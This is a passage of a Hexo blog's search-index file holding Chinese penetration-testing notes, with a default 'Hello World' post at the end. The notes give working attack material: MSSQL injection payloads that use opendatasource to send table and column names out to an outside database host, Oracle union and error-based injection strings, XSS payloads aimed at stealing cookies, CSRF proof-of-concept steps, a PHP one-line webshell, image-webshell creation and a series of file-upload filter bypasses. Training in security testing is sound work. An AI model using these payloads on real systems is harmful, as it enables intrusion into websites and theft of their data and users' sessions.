title="准备工作"></a>准备工作</h3><p>1.我们首先需要一个数据库</p><p>这里有免费可白嫖的平台让你搭建数据库，①.香港云：<a href="http://www.webweb.com" target="_blank" rel="noopener">http://www.webweb.com</a></p><p>②.国外平台：<a href="https://my.gearhost.com/CloudSite" target="_blank" rel="noopener">https://my.gearhost.com/CloudSite</a></p><p>我们注册的时候如果不想使用自己的邮箱验证，可以使用临时邮箱：bccto.me平台来进行邮箱验证</p><p>这样我们就得到了我们自己的数据库地址、数据库名、用户名、密码</p><p>2.然后我们需要用Navicat连接我们的数据库，黄色代表连接成功</p><h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><h4 id="判断是否只存在注入"><a href="#判断是否只存在注入" class="headerlink" title="判断是否只存在注入"></a>判断是否只存在注入</h4><p>用and 1=1 – qwe和and 1=2 – qwe</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL1.png" alt="MSSQL1"></p><p>显示正常</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL2.png" alt="MSSQL2"></p><p>显示不正常</p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><pre><code>' order by 1 -- qwe            #显示正常' order by 2 -- qwe            #显示正常' order by 3 -- qwe            #显示正常' order by 4 -- qwe            #报错</code></pre><p>判断出来有三个字段获取id和表名</p><h4 id="获取id和表名"><a href="#获取id和表名" class="headerlink" title="获取id和表名"></a>获取id和表名</h4><pre><code>'; insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=samedi;pwd=xxxxxxxxxx;database=samedi').samedi.dbo.object select id,name from sysobjects where xtype='U' --+</code></pre><p>注入上面的语句我们就可以获得表名</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL3.png" alt="MSSQL3"></p><p>admin表对应的id为“1977058079”</p><h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><pre><code>'; insert into opendatasource('sqloledb','server=den1.mssql8.gear.host,1433;uid=samedi;pwd=xxxxxxxxxxx;database=samedi').samedi.dbo.columns select name from syscolumns where id=1977058079 --+</code></pre><p>通过id,我们可以找到admin表对应的字段，创建另一个只有一个字段的表columns，当然，也可以用之前的那个表。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/26/shen-tou-ce-shi-zong-jie/MSSQL4.png" alt="MSSQL4"></p><p>之后获取字段中的数据也是轻而易举的了，因为知道了有4个字段，所以我们在自己的数据库中创建一个有4个字段的表</p><pre><code>select *from admin --+</code></pre><h2 id="Oracle注入——报错注入"><a href="#Oracle注入——报错注入" class="headerlink" title="Oracle注入——报错注入"></a>Oracle注入——报错注入</h2><p>MySQL中的报错注入使用的函数是updatexml()</p><p>Oracle数据库中存在虚表/实表，Oracle弱化了库的概念，强化了用户的概念，用户就是库</p><h3 id="系统自带库"><a href="#系统自带库" class="headerlink" title="系统自带库"></a>系统自带库</h3><pre><code>select * from all_tables                #列出所有表select * from user_tables                #查询出当前用户的表select * from all_tab_columns            #查询出所有字段select * from user_tab_coulumns            #查询出当前用户的字段select * from v$version                    #查版本</code></pre><h3 id="limit的使用"><a href="#limit的使用" class="headerlink" title="limit的使用"></a>limit的使用</h3><p>Oracle用的是rownum=1：限制查询返回的总行数为一条，且大于1时，只能用小于号，例：</p><pre><code>select * from admin where rownum=1        #一条数据select * from admin where rownum&lt;3        #两条数据</code></pre><p>select rownum,UNAME from admin</p><table><thead><tr><th>ROWNUM</th><th>UNAME</th></tr></thead><tbody><tr><td>1</td><td>admin</td></tr><tr><td>2</td><td>root</td></tr></tbody></table><h3 id="Oracle显错注入"><a href="#Oracle显错注入" class="headerlink" title="Oracle显错注入"></a>Oracle显错注入</h3><pre><code>and 1=1and 1=2order by 1··union select null,null,null from  dual我们是需要知道null的字段类型，从而来代替null的，这里假如知道union select 1,null,to_nchar('a') from dual这里需要将union前面的语句显示不出来，比如说将id字段输入一个不存在的数字，例：1000id=1000 union all select 1,null,to_nchar('table_name') from user_tables查出来表名为xxxid=1000 union all select 1,null,to_nchar('table_name') from user_tables where table_name&lt;&gt;'xxx'这句相当于将xxx排除，因此可以得到其他表名，例：ADMIN还想获得下一个表名就在这句后面加上and table_name&lt;&gt;'ADMIN'select username from (select rownum r,username from all_users) where r=1r相当于rownum的别名，r=2就是第2条数据select column_name from(select rownum r,column_name from user_tab_columns) where r=1id=1000 union all select 1,null,to_nchar(column_name) from (select rownum r,column_name from user_tab_columns where table_name='ADMIN') where r=1select 1,null,to_char(UPASS) from (select rownum r,UPASS from admin) where r=1</code></pre><h3 id="Oracle报错注入"><a href="#Oracle报错注入" class="headerlink" title="Oracle报错注入"></a>Oracle报错注入</h3><p>CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))</p><p>：去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误，从而爆出查询内容）</p><pre><code>id=1000 and 1=CTXSYS.DRITHSX.SN(1,(select table_name from user_tables where rownum=1))</code></pre><p>报错不需要union，之后的跟显错注入是一样的。</p><h2 id="XSS原理分析与解剖"><a href="#XSS原理分析与解剖" class="headerlink" title="XSS原理分析与解剖"></a>XSS原理分析与解剖</h2><p>如果我们想进入管理员后台？</p><p>1.找后台地址，输入正确的账号密码</p><p>2.通过cookie，不用账号密码</p><p>Cookie是以分号结尾的，第一个等号的后面都是值</p><p>XSS最大的作用就是窃取Cookie，Cookie是存放在用户的浏览器中的</p><br><p>XSS也是注入的一种：前段注入</p><p>XSS可以：窃取Cookie（用的最频繁）、获取内网ip、获取浏览器中保存的明文密码、截取网页屏幕、网页上的键盘记录</p><p>XSS分类：</p><p>​    反射型：你提交的数据成功的实现了XSS，不会放入数据库中，但是仅仅是对你这次访问产生了影响，是非持久型攻击；</p><p>​    存储型：你提交的数据成功的实现了XSS，存入了数据库中，别人访问这个页面的时候就会自动触发；</p><p>​    DOM型：完全是客户机的事情，与前端交互。</p><h3 id="我们与网站之间的交互是怎样的？"><a href="#我们与网站之间的交互是怎样的？" class="headerlink" title="我们与网站之间的交互是怎样的？"></a>我们与网站之间的交互是怎样的？</h3><p>请求网站，网站返回前端代码，浏览器根据前端代码解析执行，渲染出好看的页面</p><p>PHP是服务器执行的，前端代码是被浏览器执行的。</p><h3 id="怎么测试网站是否存在XSS？"><a href="#怎么测试网站是否存在XSS？" class="headerlink" title="怎么测试网站是否存在XSS？"></a>怎么测试网站是否存在XSS？</h3><p>三种触发方法：</p><h4 id="标签触发"><a href="#标签触发" class="headerlink" title="标签触发"></a>标签触发</h4><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>弹窗使用来证明是否存在XSS的，但是弹窗危害有些大，尽量避免使用，可以使用其他的html代码来证明是否被当做html代码执行了</p><p>在真正的项目上，还是要用弹窗来证明是否存在XSS，或直接打攻击代码窃取Cookie</p><h4 id="伪协议触发"><a href="#伪协议触发" class="headerlink" title="伪协议触发"></a>伪协议触发</h4><pre><code>JavaScript：alert(123)</code></pre><p>上面的JavaScript就是伪协议，后面的东西就会被当做js代码执行，需要点击触发，例</p><pre><code>&lt;a href="Javascript:alert(123)"&gt;abc&lt;/a&gt;</code></pre><h4 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h4><p>满足某种条件自动触发，例</p><pre><code>&lt;img src="#" onerror=alert(1) //&gt;</code></pre><p>当此图片没有加载成功的时候会触发弹窗</p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>在什么情况下双引号能够替代单引号？</p><p>1、本身就是单引号闭合，但是页面上因为浏览器渲染看着是双引号闭合</p><p>2、就没写单引号闭合</p><h3 id="存储型XSS会出现在什么地方？"><a href="#存储型XSS会出现在什么地方？" class="headerlink" title="存储型XSS会出现在什么地方？"></a>存储型XSS会出现在什么地方？</h3><p>任何可能插入数据库的地方</p><p>但是数据不一定存储在数据库中，如日志、文件</p><p>也不是只有框才会交互，数据传参要用GET、POST、HEAD，并不一定要有框，所以见框就插是一种方法，但并不唯一</p><p><strong>用户的输入，一般控制的很严格；</strong></p><p><strong>系统的获取，一般控制的不严格</strong></p><h2 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h2><p>通过js对网页进行修改的就是DOM型XSS</p><p>DOM是一个与平台、编程语言无关的接口，他允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为系那是页面的一部分。</p><p>DOM——based XSS漏洞是基于文档对象模型（Document Object Model，DOM）的一种漏洞</p><p>DOM中有很多对象，其中一些使用户可以操纵的，如url，location，refelTer等。</p><p>客户端的脚本程序可以通过DOM动态的检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM——based XSS漏洞。</p><br><p>每个载入浏览器的HTML文档都会成为Document对象，Document对象使我们可以从脚本中对HTML页面中的所有元素进行访问。</p><p>Document对象属性</p><table><thead><tr><th>属性</th><th align="left">描述</th></tr></thead><tbody><tr><td>body</td><td align="left">提供对&lt;body&gt;元素的直接访问。对于定义了框架集的文档，改属性引用最外层的&lt;frameset&gt;。</td></tr><tr><td>cookie</td><td align="left">设置或返回与当前文档有关的所有cookie。</td></tr><tr><td>domain</td><td align="left">返回当前文档的域名。</td></tr><tr><td>lastModified</td><td align="left">返回文档被最后修改的日期和时间。</td></tr><tr><td>referrer</td><td align="left">返回载入当前文档的文档的URL。</td></tr><tr><td>title</td><td align="left">返回当前文档的标题。</td></tr><tr><td>URL</td><td align="left">返回当前文档的URL</td></tr></tbody></table><p>document.cookie     可以读取cookie</p><p>JS 存在的意义就是让更多的工作在访问者自己的电脑中去处理，从而降低对服务器资源的占用</p><p>用document.lastModified  可以返回时间</p><p>静态页面所返回的时间是不变的，伪静态页面所返回的时间是变化的</p><p><strong>动态和伪静态页面漏洞相较于静态页面会更多</strong></p><p>Document对象方法</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>close()</td><td>关闭用document.open()方法打开的输出流，并显示选定的数据。</td></tr><tr><td>getElementById()</td><td>返回对拥有指定id的第一个对象的引用。</td></tr><tr><td>getElementsByName()</td><td>返回带有指定名称的对象集合。</td></tr><tr><td>getElementByTagName()</td><td>返回带有指定标签名的对象集合。</td></tr><tr><td>open()</td><td>打开一个流，以收集来自任何document.write()或document.writeln()方法的输出。</td></tr><tr><td>write()</td><td>向文档写HTML 表达式或JavaScript代码。</td></tr><tr><td>writeln()</td><td>等同于write()方法，不同的是在每个表达式之后写一个换行符。</td></tr></tbody></table><p>document.write()        他可以接受native编码值</p><p><strong>JS触发的XSS就是DOM型XSS，是前端产生了问题</strong></p><h2 id="跨站请求伪造——CSRF"><a href="#跨站请求伪造——CSRF" class="headerlink" title="跨站请求伪造——CSRF"></a>跨站请求伪造——CSRF</h2><p>CSRF：借用你的Cookie；XSS：窃取你的Cookie</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当访问了一个有CSRF的网站，同时又访问了一个之前登陆过的网站，这时，这个登陆过的网站中的你的账号内的有些东西会被更改。</p><p>CSRF（Cross-site request forgery）跨站请求伪造：也被称为“One Click Attack”或者“Session Riding”，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的新人用户，而CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p><p>其实说白了，CSRF漏洞的成因就是网站的Cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的CSRF脚本或者包含CSRF脚本的链接，可能会执行一些用户不想的功能（比如是添加账号等）。</p><p>CSRF核心在于缺乏验证</p><p>1、像验证码是他做好的方法，但开发不可能给每一个步骤都添加验证码，因为那样用户体验感极差；</p><p>2、开发为了安全，设置了一个东西叫做Token，Token是一种验证机制，每个请求的表单中都存在着一个Token字段</p><br><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>现在A站创建一个用户，并修改它的个人资料，在那个A站想要改其内容的页面用burp抓一个包，然后右键-&gt;Engagemant tools-&gt;GGenerate CSRF POC</p><p>将产生的html代码保存在一个html文件中，此代码即为攻击代码</p><p>再注册另一个账号，然后打开那个保存在本地上的攻击页面，点击按钮，然后刷新第二个站好的个人资料页面，发现内容变了，那么这个地方就存在CSRF漏洞。</p><p>也可以设置自动触发：将攻击页面的那个按钮里的</p><form></form>以及内容删掉，然后在函数后的一行<script>与</script>内加上一行submitReques()，也就是直接运行这个函数。<p></p><h2 id="文件上传漏洞——解析、验证、伪造（一）（黑名单）"><a href="#文件上传漏洞——解析、验证、伪造（一）（黑名单）" class="headerlink" title="文件上传漏洞——解析、验证、伪造（一）（黑名单）"></a>文件上传漏洞——解析、验证、伪造（一）（黑名单）</h2><p>首先讲一下各种shell的含义：</p><p>webshell：网站权限</p><p>getshell：获取权限</p><p>反弹shell：受害及其会访问攻击机</p><p>正常shell：攻击机连接木马</p><br><p>PHP常用的一句话木马：</p><pre><code>&lt;?php eval($_REQUEST['a'])?&gt;</code></pre><br><p>webshell管理工具有:</p><p>中国菜刀、蚁剑、冰蝎等</p><br><p>数据库一般是外界访问不到的，所以密码一般都不会改</p><p>正常黑客思维：</p><p>我就是要拿权限，怎么拿不重要，大部分思路-&gt;SQL注入，获得密码，进入后台，上传文件，有的时候，前台上传一句话木马拿下服务器也是常见的。</p><p>黑白名单机制：</p><p>黑名单：不允许上传什么</p><p>白名单：只允许上传什么</p><p>白名单相比于黑名单更安全</p><h3 id="上传遇到的情况："><a href="#上传遇到的情况：" class="headerlink" title="上传遇到的情况："></a>上传遇到的情况：</h3><p>前端检测的情况：一般是在网页上写一段JS代码，用Js去检测，验证上传文件的后缀名，有白名单也有和名单</p><p>判断方法：在浏览加载文件，但未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包，所以可以通过抓包来判断，如果弹出不允许上传，但是没有抓到数据包，那么就是前端验证</p><p>前端验证非常不可靠，传正常文件改数据包就可以绕过，甚至关闭JS都可以尝试绕过</p><br><p>服务端检测的情况：</p><p>常见手段：检查Content-Type（内容类型）、检查后缀（检查后缀是主流）、检查文件头</p><p>如何绕过Content-Type和文件头检测，这个时候我们就要去制作一个图片马了；</p><h4 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h4><p>图片马制作很简单，写一个一句话木马放在TXT文件，然后找一张你喜欢的图片（注意文件大小，越小越好），然后打开cmd</p><pre><code>copy a.jpg/b+1.txt 123.jpg        (将a.jpg和1.txt合并为123.jpg)</code></pre><p>图片马可以很好的绕过内容类型和文件头</p><p>/b的意思是将它以二进制的方法去合并，为了防止图片破碎</p><h4 id="判断黑白名单"><a href="#判断黑白名单" class="headerlink" title="判断黑白名单"></a>判断黑白名单</h4><p>上传一个2.a文件，若能上传就是黑名单机制</p><h3 id="上传绕过方法："><a href="#上传绕过方法：" class="headerlink" title="上传绕过方法："></a>上传绕过方法：</h3><h4 id="1、最不可靠的前端验证"><a href="#1、最不可靠的前端验证" class="headerlink" title="1、最不可靠的前端验证"></a>1、最不可靠的前端验证</h4><p>直接抓包，将上传的jpg改为php即可</p><h4 id="2、Content-Type绕过"><a href="#2、Content-Type绕过" class="headerlink" title="2、Content-Type绕过"></a>2、Content-Type绕过</h4><p>既然是检查文件类型，拿出我们的图片马，web容器是根据后缀来识别格式的，我只要上传的文件后缀是.php就行</p><h4 id="3、黑名单绕过"><a href="#3、黑名单绕过" class="headerlink" title="3、黑名单绕过"></a>3、黑名单绕过</h4><p>如果.php无法上传，那我们就尝试.php3、.php4、.php5、.phtml，这些默认都会被解析为php的</p><h4 id="4、-htaccess文件绕过"><a href="#4、-htaccess文件绕过" class="headerlink" title="4、.htaccess文件绕过"></a>4、.htaccess文件绕过</h4><p>.htaccess是什么？</p><p>全称是Hypertext Access(超文本入口)，.htaccess文件也被称为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。</p><p>.htaccess功能：</p><p>文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表</p><p><strong>很可以，这么一个强大的功能默认是不开启的</strong></p><p>写一个文件1.txt，内容为</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><p>这个指令代表着.jpg文件会被当做php来解析，重命名这个文件为.htaccess</p><pre><code>ren 1.txt .htaccess</code></pre><p>上传图片马之后再上传.htaccess文件，图片马便会被解析</p><h4 id="5、大小写绕过"><a href="#5、大小写绕过" class="headerlink" title="5、大小写绕过"></a>5、大小写绕过</h4><p>我们可以通过大小写去绕过，web容器除非非常老的版本，不然都不区分大小写</p><p>例：PHp</p><h4 id="6、文件后缀（空）绕过"><a href="#6、文件后缀（空）绕过" class="headerlink" title="6、文件后缀（空）绕过"></a>6、文件后缀（空）绕过</h4><p>在文件名后面留一个空格，然后上传上去后空格会被自动的省略，添加空格是在burp中进行的。</p><h4 id="7、文件后缀（点）绕过"><a href="#7、文件后缀（点）绕过" class="headerlink" title="7、文件后缀（点）绕过"></a>7、文件后缀（点）绕过</h4><p>windows有一个特性，会自动去掉后缀名最后的.</p><h4 id="8、-DATA（Windows文件流绕过）"><a href="#8、-DATA（Windows文件流绕过）" class="headerlink" title="8、::$DATA（Windows文件流绕过）"></a>8、::$DATA（Windows文件流绕过）</h4><p>这里利用了NTFS交换数据流（ADS），ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解，就是其他文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿文件。</p><p>我们肯定不太懂这什么意思，我们现在cmd运行一个</p><pre><code>echo abcd&gt;&gt;a.txt:b.txt</code></pre><p>​    将abcd写入到a.txt:b.txt中，很明显会生成一个a.txt，但是我们打开a.txt却什么都没发现，我们要编辑就要</p><pre><code>notepad a.txt:b.txt</code></pre><p>我们用dir  /R 就可以看到a.txt:b.txt</p><p>我们饶过，就在burp中将文件名改为1.php::$DATA即可</p><h4 id="9、用php-空-绕过"><a href="#9、用php-空-绕过" class="headerlink" title="9、用php.空.绕过"></a>9、用php.空.绕过</h4><p>因为判断代码可能只去掉结尾的点</p><h4 id="10、pphphp绕过"><a href="#10、pphphp绕过" class="headerlink" title="10、pphphp绕过"></a>10、pphphp绕过</h4><p>若遇到黑名单中出现的字符串都会被变成空值，那么就用pphphp绕过，其原理就是缺乏二次校验</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/07/24/hello-word/"/>
      <url>/2020/07/24/hello-word/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
